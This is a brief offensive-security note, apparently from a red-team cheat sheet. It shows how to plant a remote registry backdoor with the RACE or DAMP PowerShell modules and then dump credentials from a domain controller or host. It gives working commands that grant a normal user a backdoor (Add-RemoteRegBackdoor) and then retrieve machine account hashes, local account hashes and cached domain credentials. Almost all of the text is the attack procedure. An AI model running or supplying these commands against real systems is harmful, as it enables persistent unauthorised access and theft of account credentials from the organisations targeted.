
this technique use registry change to easy dump credential from remote DC or local Machine 
in this scenario we use Race module in powershell 
*note :* this technique need the high level privileges
for do this persistence on remote machine Using Race or DAMP, with Admin Privilege
`PS > Add-RemoteRegBackdoor -ComputerName mal-analysis -Trustee normaluser -Verbose

- now as normal user we can dump the credential 
`PS > Get-RemoteMachineAccountHash -ComputerName mal-analysis -Verbose

- Retrieve Local Account Hash 
`PS > Get-RemoteLocalAccountHash -ComputerName mal-analysis -Verbose

- Retrieve Domain cached Credentials
`PS > Get-RemoteCachedCredential -ComputerName mal-analysis -Verbose

resource : https://github.com/samratashok/RACE 
resource : https://github.com/HarmJ0y/DAMP 